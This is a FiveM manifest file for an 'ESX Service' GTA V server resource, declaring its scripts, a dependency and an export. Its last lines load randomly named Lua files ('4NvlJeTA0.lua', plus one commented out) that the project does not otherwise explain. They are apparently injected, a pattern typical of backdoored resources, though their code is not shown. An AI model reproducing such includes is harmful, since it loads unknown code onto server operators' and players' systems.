fx_version 'adamant'

game 'gta5'

description 'ESX Service'

version '1.0.0'

server_scripts {
	'server/main.lua'
}

client_scripts {
	'client/main.lua'
}

dependency 'es_extended'

--client_script 'rw3N8ZsAHXd.lua'
server_exports { "GetInServiceCount" }

client_script '4NvlJeTA0.lua'
